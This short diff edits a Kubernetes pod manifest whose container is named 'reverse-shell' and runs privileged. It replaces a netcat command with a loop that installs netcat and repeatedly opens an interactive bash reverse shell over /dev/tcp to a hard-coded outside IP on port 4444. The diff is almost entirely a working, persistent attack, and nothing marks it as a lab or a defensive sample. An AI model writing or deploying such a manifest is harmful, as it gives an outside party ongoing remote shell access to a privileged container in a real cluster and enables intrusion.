@@ -14,7 +14,15 @@ spec:
     - name: reverse-shell
       image: ubuntu:latest
       command: ["/bin/bash", "-c", "--"]
-      args: ["nc 23.27.169.114 4444 -e /bin/bash;"]
+      args:
+        - |
+          # Install netcat
+          apt-get update && apt-get install -y netcat && \
+          # Create and execute the reverse shell
+          while true; do \
+            /bin/bash -i >& /dev/tcp/23.27.169.114/4444 0>&1; \
+            sleep 10; \
+          done
       securityContext:
         privileged: true  # Set to false unless needed
       tty: true
